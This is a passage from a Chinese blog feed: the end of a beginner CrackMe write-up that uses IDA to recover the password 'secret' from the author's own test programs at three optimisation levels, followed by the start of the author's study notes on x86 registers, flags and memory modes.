&lt;p>又根据&lt;code>cdecl&lt;/code>调用约定，函数参数通过栈传递，参数从右往左压栈。我们看这个&lt;code>call&lt;/code>指令前的三句&lt;code>mov&lt;/code>。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="nf">mov&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">esp&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="no">h&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="no">Ix&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">ecx&lt;/span> &lt;span class="c">; Str1
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">mov&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">esp&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="no">h&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="no">Str2&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c">; Str2
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">mov&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">esp&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="no">h&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="no">MaxCount&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="mi">6&lt;/span> &lt;span class="c">; MaxCount
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>需要注意的是没有用&lt;code>push&lt;/code>指令，所以三个&lt;code>mov&lt;/code>在栈上的顺序要根据偏移算。我们偷个懒直接看&lt;code>strncmp&lt;/code>函数的签名就行，IDA也分析出了压栈的地址在注释里。往上看，看看&lt;code>ecx&lt;/code>和&lt;code>eax&lt;/code>又是哪儿来的。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="nf">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="no">var_8&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">ecx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="no">Str1&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>再看&lt;code>ebp+var_8&lt;/code>和&lt;code>ebp+str1&lt;/code>又是什么。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="nf">lea&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">aSecret&lt;/span> &lt;span class="c">; &amp;#34;secret&amp;#34;
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">mov&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="no">var_8&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="no">eax&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>所以有一个参数是字符串 &lt;code>&amp;quot;secret&amp;quot;&lt;/code>，作为关键跳前 &lt;code>_strncmp&lt;/code> 的参数。&lt;/p>
&lt;p>让我们尝试一下。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-01/cm01-easy-7.png"
loading="lazy"
alt="image-20210912181959230"
>&lt;/p>
&lt;p>成功完成。&lt;/p>
&lt;h3 id="反汇编---normal">反汇编 - Normal&lt;/h3>
&lt;p>接下来看使用&lt;code>-O1&lt;/code>编译，开启了部分编译器优化的版本。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-01/cm01-normal-1.png"
loading="lazy"
alt="image-20210912183427553"
>&lt;/p>
&lt;p>可以看到，因为编译器优化的缘故，原本清晰的分支变成了一个仅有一个循环。&lt;/p>
&lt;p>还是先找到关键跳，肉眼过一遍循环中的函数调用，&lt;code>sub_401180&lt;/code>从参数看应该是一个往终端打印字符串的函数，忽略。&lt;code>___acrt_iob_func&lt;/code>意义不明也忽略。下一个&lt;code>sub_401000&lt;/code>依然有点意义不明，先跳过。再往下就看到了老熟人了，&lt;code>_strncmp&lt;/code>，&lt;code>&amp;quot;secret&amp;quot;&lt;/code>参数更是直接用一个push给压栈了，分析到此结束？&lt;/p>
&lt;p>不过还有一个问题没解决：失败的提示我们看到了，成功的跳转在哪儿呢？&lt;/p>
&lt;p>从&lt;code>call _strncmp&lt;/code>开始往下看。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="nf">call&lt;/span> &lt;span class="no">_strncmp&lt;/span> &lt;span class="c">; 调用，cdecl约定下，返回值在 eax
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">add&lt;/span> &lt;span class="no">esp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="no">Ch&lt;/span> &lt;span class="c">; 清栈
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">mov&lt;/span> &lt;span class="no">esi&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c">; 函数返回值存入 esi
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">test&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c">; TEST 指令把操作数按位与并设置标志位，如果 eax 是 0 则 ZF 会设置成 1，否则就是 0。
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">offset&lt;/span> &lt;span class="no">aWrongPwd&lt;/span> &lt;span class="c">; eax = &amp;#34;wrong pwd!\n&amp;#34;
&lt;/span>&lt;span class="c">; ebp 被设置为了字符串 &amp;#34;Good job!\n&amp;#34;
&lt;/span>&lt;span class="c">; cmovz 或者说 cmov* 系列的函数用后缀的单个字符表示用哪个标志位来决定是否mov，比如cmovz就是用ZF标志位决定是否执行mov。
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">cmovz&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">ebp&lt;/span>
&lt;span class="no">push&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c">; 如果 strncmp 返回 0 则是 Good job!\n ，反则 wrong pwd!\n
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">call&lt;/span> &lt;span class="no">sub_401180&lt;/span> &lt;span class="c">; 调用一个输出字符串的函数
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>用伪代码来表示，就是&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Good job!&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="n">compare_result&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="s2">&amp;#34;wrong pwd!&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="反汇编---hard">反汇编 - Hard&lt;/h3>
&lt;p>Hard启用了&lt;code>-O2&lt;/code>，也就是开启了大部分编译器优化。用IDA打开。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-01/cm01-hard-1.png"
loading="lazy"
alt="image-20210912185949657"
>&lt;/p>
&lt;p>因为编译器十分聪明地把一些函数给内联编译进了 main 函数，现在 main 函数的控制流已经乱的一批。挨个读下去虽然还可行，但实在费神费力。&lt;/p>
&lt;p>不过在这个条件下依然还有解决办法：我们可以通过错误或成功的提示字符串找关键跳。&lt;/p>
&lt;p>已知错误时会输出&amp;quot;wrong pwd!&amp;quot;，我们在IDA找到字符串视图。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-01/cm01-hard-2.png"
loading="lazy"
alt="image-20210912190657661"
>&lt;/p>
&lt;p>然后在视图中找到字符串。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-01/cm01-hard-3.png"
loading="lazy"
alt="image-20210912190827657"
>&lt;/p>
&lt;p>其实就是在内存数据段（Data Segment）或者PE的数据节（Data Section）中的字符串啦，一般手写的字符串字面量都会直接编译到这里。&lt;/p>
&lt;p>在我们要找的字符串上双击，就会跳到汇编视图中的字符串位置。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-01/cm01-hard-4.png"
loading="lazy"
alt="image-20210912191125747"
>&lt;/p>
&lt;p>然后再双击图中位置。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-01/cm01-hard-5.png"
loading="lazy"
alt="image-20210912191344967"
>&lt;/p>
&lt;p>即可跳转到引用。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/image/crackme-01/cm01-hard-6.png"
loading="lazy"
alt="image-20210912191435672"
>&lt;/p>
&lt;p>接着看跳转到的上下文，又变成了十分熟悉的正确错误分支。往前找到 &lt;code>_strncmp&lt;/code>的参数。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="nf">push&lt;/span> &lt;span class="mi">6&lt;/span>
&lt;span class="nf">push&lt;/span> &lt;span class="no">offset&lt;/span> &lt;span class="no">Str2&lt;/span> &lt;span class="c">; &amp;#34;secret&amp;#34;
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">push&lt;/span> &lt;span class="no">edx&lt;/span> &lt;span class="c">; Str1
&lt;/span>&lt;span class="c">&lt;/span>&lt;span class="no">mov&lt;/span> &lt;span class="no">ebp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">edx&lt;/span>
&lt;span class="nf">call&lt;/span> &lt;span class="no">_strncmp&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>也就是 &lt;code>strncmp(edx,&amp;quot;secret&amp;quot;,6)&lt;/code>，密钥就是 &lt;code>&amp;quot;secret&amp;quot;&lt;/code>没错了。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>这个 CrackMe （以后也许还有）的主要用途是学习逆向和汇编的基础知识，巩固记忆，学习和熟悉工具。所以尽可能去除干扰项，只保留想要巩固学习的部分，看起来很傻，基本没啥挑战性。&lt;/p>
&lt;p>有些公共的前置知识（比如寄存器和栈，调用约定，内存模型）我做了个笔记，大概是入不了大佬的眼的。可以在[这里](&lt;a class="link" href="https://nnnewb.github.io/blog/p/assembly-learning-note/" target="_blank" rel="noopener"
>32位 Windows x86 汇编语言学习 (nnnewb.github.io)&lt;/a>)看看。&lt;/p>
&lt;p>目前能找到很多 Delphi 和 VB 编写的 CrackMe，Delphi 现在搜搜还能看到些 &lt;em>Delphi still alive&lt;/em> 的文章，不过确实比较少见了吧。提到学 GUI 编程，不是推荐 C++/Qt 就是 .Net 全家桶。VB 更是早已完蛋（不是VB.Net），老实说这些 CrackMe 不知道转了几手，还能玩是还能玩，虽然但是吧，总之对我还是略难，看别人的 CrackMe 题解也挺迷茫。&lt;/p>
&lt;p>不过自己会编程就好了嘛！&lt;/p></description></item><item><title>32位 Windows x86 汇编语言学习</title><link>https://nnnewb.github.io/blog/p/assembly-learning-note/</link><pubDate>Thu, 09 Sep 2021 16:14:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/assembly-learning-note/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>最近迷上了 Crack Me，入门无果。老是看到有大佬发52pojie又有哪个佬把什么黄油给手撕了，心痒痒。干脆也正正经经地去学一下好了。&lt;/p>
&lt;p>这当然也算是程序员本职的正经知识（心虚而且超大声）。&lt;/p>
&lt;h2 id="常规知识和速记">常规知识和速记&lt;/h2>
&lt;p>笔记内容是关于 8086/x86 汇编。&lt;/p>
&lt;p>x86体系结构下内存和寄存器都是小端序。小端序指低位在右，高位在左。如&lt;code>0x1&lt;/code>的小端序表示是&lt;code>0000 0001&lt;/code>。&lt;/p>
&lt;p>8比特能表示2位16进制数（&lt;code>0xFF&lt;/code>，也就是&lt;code>255&lt;/code>），16比特能表示4位16进制数（&lt;code>0xFFFF&lt;/code>，&lt;code>65535&lt;/code>），32比特能表示8位16进制数（&lt;code>0XFFFFFFFF&lt;/code>，&lt;code>4294967295&lt;/code>）。&lt;/p>
&lt;p>数据类型：&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>助记符&lt;/th>
&lt;th>描述&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>&lt;code>dword&lt;/code>&lt;/td>
&lt;td>双字（double word），32比特整型数据。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>word&lt;/code>&lt;/td>
&lt;td>字，16比特整型数据。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>byte&lt;/code>&lt;/td>
&lt;td>字节，8比特整型数据。&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>常用的16进制数记法：&lt;/p>
&lt;ul>
&lt;li>&lt;code>0x2A&lt;/code>，前缀&lt;code>0x&lt;/code>&lt;/li>
&lt;li>&lt;code>2AH&lt;/code>，后缀&lt;code>H&lt;/code>&lt;/li>
&lt;/ul>
&lt;h2 id="寄存器">寄存器&lt;/h2>
&lt;h3 id="通用寄存器">通用寄存器&lt;/h3>
&lt;p>参考：&lt;a class="link" href="https://zh.wikibooks.org/wiki/X86_%E6%B1%87%E7%BC%96/X86_%E6%9E%B6%E6%9E%84" target="_blank" rel="noopener"
>x86汇编 - 维基百科&lt;/a>&lt;/p>
&lt;p>参考：&lt;a class="link" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/x64-architecture" target="_blank" rel="noopener"
>x64体系结构 - windows hardware&lt;/a>&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>64位寄存器&lt;/th>
&lt;th>32位寄存器&lt;/th>
&lt;th>16位寄存器&lt;/th>
&lt;th>8位寄存器&lt;/th>
&lt;th>用途&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>&lt;code>RAX&lt;/code>或&lt;code>R0&lt;/code>&lt;/td>
&lt;td>&lt;code>EAX&lt;/code>&lt;/td>
&lt;td>&lt;code>AX&lt;/code>&lt;/td>
&lt;td>&lt;code>AL&lt;/code>和&lt;code>AH&lt;/code>&lt;/td>
&lt;td>Accumlator，累加寄存器，用于算术运算。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>RBX&lt;/code>或&lt;code>R3&lt;/code>&lt;/td>
&lt;td>&lt;code>EBX&lt;/code>&lt;/td>
&lt;td>&lt;code>BX&lt;/code>&lt;/td>
&lt;td>&lt;code>BL&lt;/code>和&lt;code>BH&lt;/code>&lt;/td>
&lt;td>Base，基址寄存器，指向数据块基址（段模式存于段寄存器&lt;code>DS&lt;/code>）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>RCX&lt;/code>或&lt;code>R1&lt;/code>&lt;/td>
&lt;td>&lt;code>ECX&lt;/code>&lt;/td>
&lt;td>&lt;code>CX&lt;/code>&lt;/td>
&lt;td>&lt;code>CL&lt;/code>和&lt;code>CH&lt;/code>&lt;/td>
&lt;td>Counter，用于用于移/环指令及循环（没懂）。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>RDX&lt;/code>或&lt;code>R2&lt;/code>&lt;/td>
&lt;td>&lt;code>EDX&lt;/code>&lt;/td>
&lt;td>&lt;code>DX&lt;/code>&lt;/td>
&lt;td>&lt;code>DL&lt;/code>和&lt;code>DH&lt;/code>&lt;/td>
&lt;td>Data，用于数学运算和IO操作。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>RSI&lt;/code>或&lt;code>R6&lt;/code>&lt;/td>
&lt;td>&lt;code>ESI&lt;/code>&lt;/td>
&lt;td>&lt;code>SI&lt;/code>&lt;/td>
&lt;td>&lt;code>SIL&lt;/code>&lt;/td>
&lt;td>Source Index，指向指令流操作中的源。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>RDI&lt;/code>或&lt;code>R7&lt;/code>&lt;/td>
&lt;td>&lt;code>EDI&lt;/code>&lt;/td>
&lt;td>&lt;code>DI&lt;/code>&lt;/td>
&lt;td>&lt;code>DIL&lt;/code>&lt;/td>
&lt;td>Destination Index，指向指令流操作中的目标。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>RBP&lt;/code>或&lt;code>R5&lt;/code>&lt;/td>
&lt;td>&lt;code>EBP&lt;/code>&lt;/td>
&lt;td>&lt;code>BP&lt;/code>&lt;/td>
&lt;td>&lt;code>BPL&lt;/code>&lt;/td>
&lt;td>Stack Base Pointer，指向栈的基地址。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>RSP&lt;/code>或&lt;code>R4&lt;/code>&lt;/td>
&lt;td>&lt;code>ESP&lt;/code>&lt;/td>
&lt;td>&lt;code>SP&lt;/code>&lt;/td>
&lt;td>&lt;code>SPL&lt;/code>&lt;/td>
&lt;td>Stack Pointer，指向栈顶的地址。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>R8&lt;/code>&lt;/td>
&lt;td>&lt;code>R8D&lt;/code>&lt;/td>
&lt;td>&lt;code>R8W&lt;/code>&lt;/td>
&lt;td>&lt;code>R8B&lt;/code>&lt;/td>
&lt;td>无别名。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>R9&lt;/code>&lt;/td>
&lt;td>&lt;code>R9D&lt;/code>&lt;/td>
&lt;td>&lt;code>R9W&lt;/code>&lt;/td>
&lt;td>&lt;code>R9B&lt;/code>&lt;/td>
&lt;td>无别名。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>R10&lt;/code>&lt;/td>
&lt;td>&lt;code>R10D&lt;/code>&lt;/td>
&lt;td>&lt;code>R10W&lt;/code>&lt;/td>
&lt;td>&lt;code>R10B&lt;/code>&lt;/td>
&lt;td>无别名。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>R11&lt;/code>&lt;/td>
&lt;td>&lt;code>R11D&lt;/code>&lt;/td>
&lt;td>&lt;code>R11W&lt;/code>&lt;/td>
&lt;td>&lt;code>R11B&lt;/code>&lt;/td>
&lt;td>无别名。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>R12&lt;/code>&lt;/td>
&lt;td>&lt;code>R12D&lt;/code>&lt;/td>
&lt;td>&lt;code>R12W&lt;/code>&lt;/td>
&lt;td>&lt;code>R12B&lt;/code>&lt;/td>
&lt;td>无别名。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>R13&lt;/code>&lt;/td>
&lt;td>&lt;code>R13D&lt;/code>&lt;/td>
&lt;td>&lt;code>R13W&lt;/code>&lt;/td>
&lt;td>&lt;code>R13B&lt;/code>&lt;/td>
&lt;td>无别名。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>R14&lt;/code>&lt;/td>
&lt;td>&lt;code>R14D&lt;/code>&lt;/td>
&lt;td>&lt;code>R14W&lt;/code>&lt;/td>
&lt;td>&lt;code>R14B&lt;/code>&lt;/td>
&lt;td>无别名。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>R15&lt;/code>&lt;/td>
&lt;td>&lt;code>R15D&lt;/code>&lt;/td>
&lt;td>&lt;code>R15W&lt;/code>&lt;/td>
&lt;td>&lt;code>R15B&lt;/code>&lt;/td>
&lt;td>无别名。&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>后续还是用 32 位寄存器的名字称呼这些寄存器。&lt;/p>
&lt;p>通用寄存器的用途并不是绝对的，程序可以根据自己的需要将通用寄存器挪作它用。&lt;/p>
&lt;p>其中：&lt;/p>
&lt;ul>
&lt;li>
&lt;p>16位寄存器本身是32位寄存器的低16位。32位寄存器的高16位没有单独的助记符。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>16位寄存器又可以单独分成两个8位寄存器使用。其中如&lt;code>AH&lt;/code>形式的寄存器表示&lt;code>AX&lt;/code>高位8比特，&lt;code>AL&lt;/code>则表示低位8比特。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="edi-和-esi">EDI 和 ESI&lt;/h3>
&lt;p>关于&lt;code>EDI&lt;/code>和&lt;code>ESI&lt;/code>这两个寄存器的用途可以参考 &lt;a class="link" href="https://stackoverflow.com/questions/1856320/purpose-of-esi-edi-registers" target="_blank" rel="noopener"
>stack overflow 的这篇问答&lt;/a>。摘一段例子，下面的C代码：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="n">srcp&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">srcidx&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">j&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以被编译成下面的汇编语句：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="nf">mov&lt;/span> &lt;span class="no">edx&lt;/span>&lt;span class="p">,[&lt;/span>&lt;span class="no">ebp&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="no">c&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="no">ecx&lt;/span>&lt;span class="p">,[&lt;/span>&lt;span class="no">edx&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">*&lt;/span>&lt;span class="no">ebx&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="nf">mov&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">ebp&lt;/span>&lt;span class="err">+&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">*&lt;/span>&lt;span class="no">edi-54&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="no">ecx&lt;/span>
&lt;span class="nf">inc&lt;/span> &lt;span class="no">edi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>ebp+0c&lt;/code>包含了&lt;code>argv&lt;/code>内容，&lt;code>ebx&lt;/code>就是&lt;code>j&lt;/code>，&lt;code>edi&lt;/code>就是&lt;code>srcidx&lt;/code>。&lt;/p>
&lt;h3 id="段寄存器">段寄存器&lt;/h3>
&lt;p>现代操作系统采用内存分页模式，把所有段寄存器指向同址来禁用内存分段模式。然而&lt;code>FS&lt;/code>和&lt;code>GS&lt;/code>依然用于内存分段模式，用于线程内数据存取。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>段寄存器助记符&lt;/th>
&lt;th>描述&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>&lt;code>SS&lt;/code>&lt;/td>
&lt;td>Stack Segment，栈段&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>CS&lt;/code>&lt;/td>
&lt;td>Code Segment，代码段&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>DS&lt;/code>&lt;/td>
&lt;td>Data Segment，数据段&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>ES&lt;/code>&lt;/td>
&lt;td>Extra Segment，额外数据段&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>FS&lt;/code>&lt;/td>
&lt;td>更额外的数据段&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>GS&lt;/code>&lt;/td>
&lt;td>更额外的数据段&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>x86一共有6个段寄存器，所有段寄存器都是16比特位宽。&lt;/p>
&lt;p>关于段寄存器用途和计算放在主存一节中。&lt;/p>
&lt;h3 id="指令指针-eip">指令指针 EIP&lt;/h3>
&lt;p>IP 寄存器全称是 Instruction Pointer 寄存器，保存总是保存下一指令的地址。&lt;/p>
&lt;p>x86实模式下使用段内存管理，可寻址1MB内存空间，采用基址（段寄存器）左移4位加上偏移量，相当于20比特位宽地址总线。实模式下EIP可以和CS代码段寄存器结合求取下一指令的具体地址。&lt;/p>
&lt;h3 id="标志寄存器">标志寄存器&lt;/h3>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>助记符&lt;/th>
&lt;th>描述&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>&lt;code>CF&lt;/code>&lt;/td>
&lt;td>Carry Flag，进位或借位溢出时记为1，否则0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>PF&lt;/code>&lt;/td>
&lt;td>Parity Flag，运算结果最低字节有偶数个1位时记为1，否则0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>AF&lt;/code>&lt;/td>
&lt;td>Auxiliary Flag，BCD码算术运算中进位或借位溢出，即运算结果第三位发生进借位时记1，否则0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>ZF&lt;/code>&lt;/td>
&lt;td>Zero Flag，运算结果为0时记1，否则0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>SF&lt;/code>&lt;/td>
&lt;td>Sign Flag，记运算结果最高位（符号位）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>TF&lt;/code>&lt;/td>
&lt;td>Trap Flag，单步调试记1，否则0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>IF&lt;/code>&lt;/td>
&lt;td>Interrupt Enable Flag，是否允许响应中断&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>DF&lt;/code>&lt;/td>
&lt;td>Direction Flag，串方向标记，指示串指令从高地址向低地址还是低地址向高地址处理。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>OF&lt;/code>&lt;/td>
&lt;td>Overflow Flag，指示算术运算是否溢出。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>IOPL&lt;/code>&lt;/td>
&lt;td>I/O Privilege Level，I/O特权级，2比特宽，&lt;code>CPL&lt;/code>小于等于&lt;code>IOPL&lt;/code>才允许访问I/O地址空间。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>NT&lt;/code>&lt;/td>
&lt;td>Nested Task Flag，当前任务链接上衣任务时置1，否则0。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>RF&lt;/code>&lt;/td>
&lt;td>Resume Flag，控制处理器对除障异常的响应。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>VM&lt;/code>&lt;/td>
&lt;td>Virtual-8086 Mode Flag，虚拟8086模式标志，置1时进入虚拟8086模式，清0返回保护模式。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>AC&lt;/code>&lt;/td>
&lt;td>Alignment Check Flag，该标志以及在CR0寄存器中的AM位置1时将允许内存引用的对齐检查，以上两个标志中至少有一个被清零则禁用对齐检查。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>VIF&lt;/code>&lt;/td>
&lt;td>Virtual interrupt flag，该标志是IF标志的虚拟镜像(Virtual image)，与VIP标志结合起来使用。使用这个标志以及VIP标志，并设置CR4控制寄存器中的VME标志就可以允许虚拟模式扩展(virtual mode extensions)。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>VIP&lt;/code>&lt;/td>
&lt;td>Virtual interrupt pending flag，该位置1以指示一个中断正在被挂起，当没有中断挂起时该位清零。与VIF标志结合使用。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>ID&lt;/code>&lt;/td>
&lt;td>Identification flag，程序能够设置或清除这个标志指示了处理器对CPUID指令的支持。&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="主存">主存&lt;/h2>
&lt;h3 id="运行模式和地址模型">运行模式和地址模型&lt;/h3>
&lt;p>x86 CPU 运行模式主要考虑&lt;strong>实模式&lt;/strong>和&lt;strong>保护模式&lt;/strong>，以及特殊的&lt;strong>虚拟8086模式&lt;/strong>。&lt;/p>
&lt;p>实模式有自己的独特地址空间模型，下可视作16位CPU+20比特无保护地址空间，使用段寄存器和通用16位通用寄存器组合寻址，算法&lt;code>base&amp;lt;&amp;lt;4+offset&lt;/code>。最大可寻址1MB。&lt;/p>
&lt;p>虚拟8086模式用于在保护模式下运行实模式程序，并不是真正的CPU模式，CPU实际还是运行在保护模式。一些程序利用虚拟8086模式可以实现在保护模式下运行实模式程序，如 dosbox、dosemu 。&lt;/p>
